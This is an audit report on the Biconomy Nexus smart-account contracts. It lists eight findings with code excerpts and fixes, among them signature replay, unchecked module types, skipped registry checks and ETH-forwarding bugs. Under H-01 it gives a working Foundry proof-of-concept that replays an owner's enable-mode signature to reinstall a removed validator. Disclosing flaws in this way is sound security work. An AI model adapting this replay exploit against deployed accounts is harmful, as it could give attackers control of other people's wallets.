# Biconomy

THe code under review can be found in [2024-07-biconomy](https://github.com/Cyfrin/2024-07-biconomy)

## Findings Summary

| ID | Description | Severity |
| :-: | - | :-: |
[H-01](#h-01-missing-nonce-in-_getenablemodedatahash-allows-signature-replay) | Missing nonce in `_getEnableModeDataHash()` allows signature replay | High |
[H-02](#h-02-installing-validators-with-enable-mode-in-validateuserop-doesnt-check-moduletype) | Installing validators with enable mode in `validateUserOp()` doesn't check `moduleType` | High |
[H-03](#h-03-registry-is-never-called-when-setting-up-modules-using-the-bootstrap-contract) | Registry is never called when setting up modules using the `Bootstrap` contract | High |
[H-04](#h-04-msgvalue-is-not-forwarded-to-fallback-handlers) | `msg.value` is not forwarded to fallback handlers | High |
[H-05](#h-05-deploying-a-new-account-with-eth-through-biconomymetafactorydeploywithfactory-loses-funds) | Deploying a new account with ETH through `BiconomyMetaFactory.deployWithFactory()` loses funds | High |
[M-01](#m-01-missing-supportsinterface-in-nexus-accounts-violates-erc-7579) | Missing `supportsInterface()` in Nexus accounts violates ERC-7579 | Medium |
[L-01](#l-01-missing-_isinitializedmsgsender-check-in-k1validatortransferownership) | Missing `_isInitialized(msg.sender)` check in `K1Validator.transferOwnership()` | Low |
[L-02](#l-02-nexusvalidateuserop-violates-the-eip-4337-specification) | `Nexus.validateUserOp()` violates the EIP-4337 specification | Low |

## [H-01] Missing nonce in `_getEnableModeDataHash()` allows signature replay            

### Summary

`_getEnableModeDataHash()` doesn't include a nonce, thereby allowing enable mode signatures to be replayed.

### Vulnerability Details

When Nexus account owners send a transaction with enable mode in `PackedUserOperation.nonce`, [`validateUserOp()`](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/Nexus.sol#L97-L112) calls `_enableMode()` to install the validator as a new module.

[Nexus.sol#L108-L109](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/Nexus.sol#L108-L109)

```solidity
PackedUserOperation memory userOp = op;
userOp.signature = _enableMode(validator, op.signature);
```

To ensure that the account owner has allowed the validator to be installed, the validator (ie. `module` shown below) is hashed alongside its data (ie. `moduleInitData`) in `_getEnableModeDataHash()`, and subsequently checked to be signed by the owner in `enableModeSignature` in `_checkEnableModeSignature()`:

[ModuleManager.sol#L166-L171](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L166-L171)

```solidity
(moduleType, moduleInitData, enableModeSignature, userOpSignature) = packedData.parseEnableModeData();  

_checkEnableModeSignature(
    _getEnableModeDataHash(module, moduleInitData),
    enableModeSignature
);
_installModule(moduleType, module, moduleInitData);
```

However, the hash returned by `_getEnableModeDataHash()` does not include a nonce:

[ModuleManager.sol#L388-L398](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L388-L398)

```solidity
function _getEnableModeDataHash(address module, bytes calldata initData) internal view returns (bytes32 digest) {
    digest = _hashTypedData(
        keccak256(
            abi.encode(
                MODULE_ENABLE_MODE_TYPE_HASH,
                module,
                keccak256(initData)
            )
        )
    );
}
```

This allows the owner's signature to be used repeatedly.

As a result, if a validator that was previously installed through `_enableMode()` is uninstalled by the owner, a malicious relayer/bundler can re-use the previous signature to re-install it through `validatorUserOp()` again, despite not having the owner's permission.

PoC:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "test/foundry/unit/concrete/modulemanager/TestModuleManager_EnableMode.t.sol";

contract SignatureReplayTest is Test, TestModuleManager_EnableMode { 
    function test_enableModeSignatureReplay() public {
        // Create PackedUserOperation struct to install moduleToEnable
        address moduleToEnable = address(mockMultiModule);
        PackedUserOperation memory op = buildPackedUserOp(
            address(BOB_ACCOUNT), 
            getNonce(address(BOB_ACCOUNT), MODE_MODULE_ENABLE, moduleToEnable)
        );
        
        /*
        note: Alice is configured as owner for mockMultiModule in _getEnableModeDataAndHash(), 
        so she signs op.signature
        */
        op.signature = signMessage(ALICE, ENTRYPOINT.getUserOpHash(op)); 
        
        // Bob signs enable mode signature to add Alice as owner in new validator (ie. mockMultiModule)
        (bytes memory data, bytes32 hashToSign) = _getEnableModeDataAndHash();
        bytes memory enableModeSignature = signMessage(BOB, hashToSign);
        enableModeSignature = abi.encodePacked(address(VALIDATOR_MODULE), enableModeSignature);

        // Append enable mode data to op.signature
        bytes memory enableModePrefix = abi.encodePacked(
            MODULE_TYPE_VALIDATOR,
            bytes4(uint32(data.length)),
            data,
            bytes4(uint32(enableModeSignature.length)),
            enableModeSignature
        );
        op.signature = abi.encodePacked(enableModePrefix, op.signature);

        // Alice executes transaction to install moduleToEnable
        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = op;
        ENTRYPOINT.handleOps(userOps, payable(ALICE.addr));

        // moduleToEnable is installed in Bob's account
        assertTrue(BOB_ACCOUNT.isModuleInstalled(MODULE_TYPE_VALIDATOR, moduleToEnable, ""));

        // Alice turns malicious - Bob uninstalls moduleToEnable to remove her as owner
        bytes memory uninstallModuleData = abi.encodeCall(Nexus.uninstallModule, (
            MODULE_TYPE_VALIDATOR,
            moduleToEnable,
            abi.encode(address(1), abi.encodePacked(MODULE_TYPE_VALIDATOR))
        ));
        executeSingle(
            BOB,
            BOB_ACCOUNT,
            address(BOB_ACCOUNT),
            0,
            uninstallModuleData,
            EXECTYPE_DEFAULT
        );
        
        // moduleToEnable has been uninstalled
        assertFalse(BOB_ACCOUNT.isModuleInstalled(MODULE_TYPE_VALIDATOR, moduleToEnable, ""));

        // Re-install moduleToEnable with the same enableModeSignature
        op.nonce = getNonce(address(BOB_ACCOUNT), MODE_MODULE_ENABLE, moduleToEnable);
        op.signature = signMessage(ALICE, ENTRYPOINT.getUserOpHash(op)); 

        // note: enableModeSignature, which is signed by Bob, is unchanged
        op.signature = abi.encodePacked(enableModePrefix, op.signature);
        
        // Alice executes transaction to re-install moduleToEnable
        /* 
        note: Notice how Alice can execute a second transaction without Bob signing anything,
        she could even change op.calldata to make the account do anything she wants
        */
        userOps[0] = op;
        ENTRYPOINT.handleOps(userOps, payable(ALICE.addr));
        
        // moduleToEnable has been installed in Bob's account with the same enableModeSignature
        assertTrue(BOB_ACCOUNT.isModuleInstalled(MODULE_TYPE_VALIDATOR, moduleToEnable, ""));
    }

    function _getEnableModeDataAndHash() internal view returns (bytes memory, bytes32) {
        // Initialize mockMultiModule with Alice as owner
        bytes32 owner = bytes32(bytes20(ALICE_ADDRESS));
        bytes memory moduleInitData = abi.encodePacked(uint8(MODULE_TYPE_VALIDATOR), owner);

        // Build enableModeSignature
        bytes32 structHash = keccak256(abi.encode(
            MODULE_ENABLE_MODE_TYPE_HASH, 
            address(mockMultiModule), 
            keccak256(moduleInitData)
        ));
        (,string memory name,string memory version,,,,) = EIP712(address(BOB_ACCOUNT)).eip712Domain();
        bytes32 hashToSign = _hashTypedData(structHash, name, version, address(BOB_ACCOUNT));

        return (moduleInitData, hashToSign);
    }
}
```

### Impact

Due to signature replay, validators that have been uninstalled by Nexus account owners can be re-installed without their permission. 

This is especially problematic as validators are used by Nexus accounts for access control - being able to re-install a validator without the owner's permission might affect the Nexus account's permissions and allow attackers to execute transactions on behalf of the account.

### Recommendations

Include a nonce in `_getEnableModeDataHash()` to ensure that enable mode signatures cannot be replayed.

## [H-02] Installing validators with enable mode in `validateUserOp()` doesn't check `moduleType`            

### Summary

`_checkEnableModeSignature()` doesn't check that `moduleType` is permitted by the owner's signature.

### Vulnerability Details

When Nexus account owners send a transaction with enable mode in `PackedUserOperation.nonce`, [`validateUserOp()`](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/Nexus.sol#L97-L112) calls `_enableMode()` to install the validator as a new module.

[Nexus.sol#L108-L109](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/Nexus.sol#L108-L109)

```solidity
PackedUserOperation memory userOp = op;
userOp.signature = _enableMode(validator, op.signature);
```

The `moduleType` and `moduleInitData` of the validator to be installed is decoded from `PackedUserOperation.signature`:

[ModuleManager.sol#L166-L171](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L166-L171)

```solidity
(moduleType, moduleInitData, enableModeSignature, userOpSignature) = packedData.parseEnableModeData();  

_checkEnableModeSignature(
    _getEnableModeDataHash(module, moduleInitData),
    enableModeSignature
);
_installModule(moduleType, module, moduleInitData);
```

As seen from above, to ensure that the account owner has allowed the validator to be installed with `moduleInitData`,  `module` and `moduleInitData` are hashed, and the hash is checked to be signed by the owner with `enableModeSignature`.

However, `moduleType` is not included in the hash, as seen in `_getEnableModeDataHash()`:

[ModuleManager.sol#L388-L398](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L388-L398)

```solidity
function _getEnableModeDataHash(address module, bytes calldata initData) internal view returns (bytes32 digest) {
    digest = _hashTypedData(
        keccak256(
            abi.encode(
                MODULE_ENABLE_MODE_TYPE_HASH,
                module,
                keccak256(initData)
            )
        )
    );
}
```

This allows a malicious relayer/bundler to call `validateUserOp()` and specify `moduleType` as any module type. For example, instead of `MODULE_TYPE_VALIDATOR`, the attacker can specify it as `MODULE_TYPE_EXECUTOR`.

If the validator happens to be a multi-type module, this is problematic an attacker can install the validator with any module type, without the owner's permission.

### Impact

An attacker can install validators through enable mode and `validateUserOp()` with any module type, without permission from the owner.

Depending on the module being installed, this can have drastic consequences on the account, with the highest impact being executor modules as they can `delegatecall`.

### Recommendations

If `_enableMode()` is only meant to install validators, consider calling `_installModule()` with `MODULE_TYPE_VALIDATOR` instead of having it as a parameter.

Otherwise, include `moduleType` in the hash returned by `_getEnableModeDataHash()`. This ensures that the module type is permitted by the account owner's signature.

## [H-03] Registry is never called when setting up modules using the `Bootstrap` contract            

### Summary

In the `Bootstrap` contract, the registry is never called as modules are installed before calling `_configureRegistry()`.

### Vulnerability Details

According to [EIP-7484](https://eips.ethereum.org/EIPS/eip-7484#adapter-behavior), the module registry must be queried at least once before or during the transaction in which a module is installed:

> A Smart Account MUST implement the following Adapter functionality either natively in the account or as a module. This Adapter functionality MUST ensure that:
>
> * The Registry is queried about module A at least once before or during the transaction in which A is called for the first time.

However, when setting up modules and the registry for smart accounts through the `Bootstrap` contract, the registry is only configured after modules are installed.

Using `initNexusWithSingleValidator()` as example, `_configureRegistry()` is only called after the validator has been installed in `_installValidator()`:

[RegistryBootstrap.sol#L38-L47](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/utils/RegistryBootstrap.sol#L38-L47)

```solidity
function initNexusWithSingleValidator(
    IModule validator,
    bytes calldata data,
    IERC7484 registry,
    address[] calldata attesters,
    uint8 threshold
) external {
    _installValidator(address(validator), data);
    _configureRegistry(registry, attesters, threshold);
}
```

As a result, when modules are installed through the `Bootstrap` contract, the registry is never called as `registry` in `RegistryAdapter` has not been set when the  `withHook` modifier (which calls `_checkRegistry`) is reached:

[RegistryAdapter.sol#L36-L42](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/RegistryAdapter.sol#L36-L42)

```solidity
function _checkRegistry(address module, uint256 moduleType) internal view {
    IERC7484 moduleRegistry = registry;
    if (address(moduleRegistry) != address(0)) {
        // this will revert if attestations / threshold are not met
        moduleRegistry.check(module, moduleType);
    }
}
```

Essentially, the order of operations in `initNexusWithSingleValidator()` is:

* Call `_installValidator()`:
  * In `withHook`, `registry == address(0)` so the registry is not called.
  * Install the validator, which calls `validator.onInstall()`.
* Call `_configureRegistry()`, which sets `registry` to the registry address.

Therefore, since the registry is never queried although `onInstall()` is called on the modules being installed, the function violates the EIP-7484 spec.

Note that this applies to `initNexus()` and `initNexusScoped()` as well.

### Impact

When setting up modules through functions in `Bootstrap`, it is possible for modules not registered in the registry to be installed, which is a bypass of access control.

### Recommendations

For all functions in the `Bootstrap` contract, consider calling `_configureRegistry()` before installing modules.

## [H-04] `msg.value` is not forwarded to fallback handlers            

### Summary

`msg.value` is not forwarded to the fallback handler in the fallback function of `ModuleManager`.

### Vulnerability Details

The fallback function of `ModuleManager` is declared as `payable`:

[ModuleManager.sol#L72](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L72)

```solidity
fallback() external payable override(Receiver) receiverFallback {
```

However, when performing a call to the fallback handler, the ETH sent is not forwarded:

[ModuleManager.sol#L102](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/base/ModuleManager.sol#L102)

```solidity
if iszero(call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)) {
```

Therefore, if a fallback handler is called with `msg.value`, the ETH sent will not be sent to the fallback handler, but will remain in the Nexus account instead.

### Impact

The functionality of fallback handlers is unnecessarily limited as Nexus accounts cannot send ETH to them. Owners will never be able to add fallback handlers that use ETH to their Nexus accounts.

### Recommendations

Either remove `payable` from the fallback function:

```diff
- fallback() external payable override(Receiver) receiverFallback {
+ fallback() external override(Receiver) receiverFallback {
```

Or forward `msg.value` when calling the fallback function:

```diff
- if iszero(call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)) {
+ if iszero(call(gas(), handler, callvalue(), 0, add(calldatasize(), 20), 0, 0)) {
```

## [H-05] Deploying a new account with ETH through `BiconomyMetaFactory.deployWithFactory()` loses funds            

### Summary

`BiconomyMetaFactory.deployWithFactory()` does not forward ETH when calling factories.

### Vulnerability Details

When users call `createAccount()` in factories to deploy new accounts, they can send ETH for the ETH to be forwarded to the new account. For example, in `NexusAccountFactory`, `msg.value` is forwarded to the newly deployed account in `createDeterministicERC1967()`:

[NexusAccountFactory.sol#L55-L56](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/factory/NexusAccountFactory.sol#L55-L56)

```solidity
// Deploy the account using the deterministic address
(bool alreadyDeployed, address account) = LibClone.createDeterministicERC1967(msg.value, ACCOUNT_IMPLEMENTATION, actualSalt);
```

However, when calling `deployWithFactory()` in `BiconomyMetaFactory`, the function does not send `msg.value` along with the call:

[BiconomyMetaFactory.sol#L70-L72](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/factory/BiconomyMetaFactory.sol#L70-L72)

```solidity
function deployWithFactory(address factory, bytes calldata factoryData) external payable returns (address payable createdAccount) {
    require(factoryWhitelist[address(factory)], FactoryNotWhitelisted());
    (bool success, bytes memory returnData) = factory.call(factoryData);
```

Therefore, if a user calls `deployWithFactory()` with ETH to deploy a new account and send ETH to it in a single call, the ETH sent will be stuck in `BiconomyMetaFactory` instead of being forwarded to the new account.

### Impact

Users calling `deployWithFactory()` with ETH will lose the ETH sent instead of depositing it into their new account.

### Recommendations

In `deployWithFactory()`, call the factory with `msg.value`:

```diff
- (bool success, bytes memory returnData) = factory.call(factoryData);
+ (bool success, bytes memory returnData) = factory.call{ value: msg.value }(factoryData);
```

## [M-01] Missing `supportsInterface()` in Nexus accounts violates ERC-7579            

### Summary

Nexus accounts violate ERC-7579 as they do not have a `supportsInterface()` function.

### Vulnerability Details

According to the contest [README](https://github.com/Cyfrin/2024-07-biconomy/tree/main?tab=readme-ov-file#about-the-project), Nexus accounts are compliant with ERC-7579:

> Nexus is a suite of contracts for Modular Smart Accounts compliant with ERC-7579 and ERC-4337

In [EIP-7579](https://eips.ethereum.org/EIPS/eip-7579#erc-165), it states that all smart accounts must implement ERC-165:

> Smart accounts MUST implement ERC-165. However, for every interface function that reverts instead of implementing the functionality, the smart account MUST return false for the corresponding interface id.

However, the `Nexus` contract and its inherited contracts do not have a `supportsInterface()` function. This means that it does not implement ERC-165 and violates the EIP-7579 specification.

### Impact

Nexus accounts violate the EIP-7579 specification and could break composability with external integrations External integrations will call `supportsInterface()` expecting a `boolean` in return, but instead, the call will revert as the `supportsInterface()` function does not exist.

### Recommendations

Add a `supportsInterface()` function in the `Nexus` contract.

## [L-01] Missing `_isInitialized(msg.sender)` check in `K1Validator.transferOwnership()`            

### Summary

`K1Validator.transferOwnership()` does not check if the module is initialized for a smart account.

### Vulnerability Details

`K1Validator.transferOwnership()` does not check if the module has been initialized for a smart account before setting `smartAccountOwners` to the new owner:

[K1Validator.sol#L66-L71](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/modules/validators/K1Validator.sol#L66-L71)

```solidity
function transferOwnership(address newOwner) external {
    require(newOwner != address(0), ZeroAddressNotAllowed());
    require(!_isContract(newOwner), NewOwnerIsContract());

    smartAccountOwners[msg.sender] = newOwner;
}
```

Therefore, it is possible for a smart account to call `transferOwnership()` while the `K1Validator` module has not been initialized for it. If this occurs, it will no longer be possible for the module to be installed for the smart account, since `onInstall()` will revert due to the `_isInitialized()` check:

[K1Validator.sol#L53](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/modules/validators/K1Validator.sol#L51-L53)

```solidity
function onInstall(bytes calldata data) external {
    require(data.length != 0, NoOwnerProvided());
    require(!_isInitialized(msg.sender), ModuleAlreadyInitialized());
```

[K1Validator.sol#L133-L135](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/modules/validators/K1Validator.sol#L133-L135)

```solidity
function _isInitialized(address smartAccount) private view returns (bool) {
    return smartAccountOwners[smartAccount] != address(0);
}
```

As such, a smart account could be permanently prevented from using a `K1Validator` module if it calls `transferOwnership()` before initialization.

A realistic scenario where this could occur:

* Smart account owner sends a transaction calling `transferOwnership()`.
* The transaction is not executed for a long period of time.
* Smart account owner sends a transaction calling `uninstallModule()` to uninstall the module:
  * `onUninstall()` is called, which resets the module to uninitialized.
* The transaction calling `transferOwnership()` is executed afterwards.
* Now, the smart account can no longer re-install the `K1Validator` module.

### Impact

Smart accounts can be locked out of using the `K1Validator` module permanently.

### Recommendations

In `transferOwnership()`, consider checking if the module is initialized for the calling smart account with `_isInitialized(msg.sender)`.

## [L-02] `Nexus.validateUserOp()` violates the EIP-4337 specification            

### Summary

`validateUserOp()` in nexus accounts do not revert when the validator specified is not installed, violating the EIP-4337 specification.

### Vulnerability Details

According to [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#account-contract-interface), `validateUserOp()` must revert if it encounters any error apart from a signature mismatch (ie. `PackedUserOperation.signature` is not a valid signature of `userOpHash`):

> If the account does not support signature aggregation, it MUST validate the signature is a valid signature of the `userOpHash`, and SHOULD return SIG\_VALIDATION\_FAILED (and not revert) on signature mismatch. Any other error MUST revert.

However, if the validator specified in `PackedUserOperation.nonce` is not installed in the smart account, `Nexus.validateUserOp()` returns `SIG_VALIDATION_FAILED` instead of reverting:

[Nexus.sol#L104-L105](https://github.com/Cyfrin/2024-07-biconomy/blob/main/contracts/Nexus.sol#L104-L105)

```solidity
// Check if validator is not enabled. If not, return VALIDATION_FAILED.
if (!_isValidatorInstalled(validator)) return VALIDATION_FAILED;
```

This is a violation of the EIP-4337 specification - `validator` not being installed is not a mismatch between `userOpHash` and the signature provided, so the function should revert.

### Impact

Violation of the EIP-4337 specification could break composability with the `EntryPoint` contract and cause integration issues.

### Recommendations

Instead of returning `VALIDATION_FAILED`, the function should revert:

```diff
- if (!_isValidatorInstalled(validator)) return VALIDATION_FAILED;
+ require(_isValidatorInstalled(validator), InvalidModule(validator));
```